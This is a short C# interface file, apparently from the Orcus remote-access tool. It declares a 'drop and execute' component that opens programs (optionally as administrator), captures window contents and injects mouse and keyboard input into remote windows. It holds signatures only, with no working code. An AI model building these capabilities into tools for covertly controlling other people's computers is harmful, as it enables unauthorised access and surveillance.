using System;
using Orcus.Shared.Commands.DropAndExecute;
using Orcus.Shared.Commands.RemoteDesktop;
using Orcus.Shared.Data;

namespace Orcus.Commands.DropAndExecute
{
    public interface IApplicationWarder : IDisposable
    {
        void OpenApplication(string path, string arguments, bool runAsAdministrator);
        WindowUpdate GetWindowUpdate(Int64 windowHandle, out IDataInfo windowRenderData);
        void DoMouseAction(RemoteDesktopMouseAction mouseAction, int x, int y, int extra, long windowHandle);
        void DoKeyboardAction(RemoteDesktopKeyboardAction keyboardAction, short scanCode, long windowHandle);
        void StopExecution();
    }
}